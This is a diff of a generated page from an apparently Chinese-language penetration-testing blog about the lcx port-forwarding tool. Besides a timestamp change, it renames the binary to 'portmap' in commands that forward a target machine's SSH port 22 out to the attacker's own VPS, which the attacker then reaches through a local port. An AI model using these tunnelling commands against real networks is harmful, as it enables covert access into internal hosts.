@@ -89,7 +89,7 @@
 <meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Blcx&#x2F;lcx-1.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Blcx&#x2F;lcx-3.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Blcx&#x2F;lcx-2.png">
-<meta property="og:updated_time" content="2019-11-18T07:15:20.523Z">
+<meta property="og:updated_time" content="2019-11-18T08:14:46.651Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;18&#x2F;%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8Blcx&#x2F;lcx-1.png">
 
@@ -357,10 +357,10 @@
 
 <p> 通过访问目标主机映射的53端口，就相当于访问了3389端口，连接到内网的主机上</p>
 <h2 id="二、Lcx内网穿透之Linux版"><a href="#二、Lcx内网穿透之Linux版" class="headerlink" title="二、Lcx内网穿透之Linux版"></a>二、Lcx内网穿透之Linux版</h2><h4 id="1、端口转发"><a href="#1、端口转发" class="headerlink" title="1、端口转发"></a>1、端口转发</h4><p> 1.首先在自己的VPS上设置监听端口，将本VPS上的80[或者443]端口监听的流量转发给1234端口:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lcx -m 2 -p1 80[或者443] -h2 59.49.12.3[自己的vps地址] -p2 1234</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 2 -p1 80[或者443] -h2 59.49.12.3[自己的vps地址] -p2 1234</span><br></pre></td></tr></table></figure>
 
 <p>2 .在目标机器上执行转发，把目标机器的22端口转到vps的80[或者443]端口上:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lcx -m 3 -h1 192.168.0.2[目标机器的ip] -p1 22 -h2 59.49.12.3[自己的vps地址] -p2 80[或者443]</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 3 -h1 192.168.0.2[目标机器的ip] -p1 22 -h2 59.49.12.3[自己的vps地址] -p2 80[或者443]</span><br></pre></td></tr></table></figure>
 
 <p>3 .回到我们自己的VPS上进行连接：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@127.0.0.1 -p 1234</span><br></pre></td></tr></table></figure>
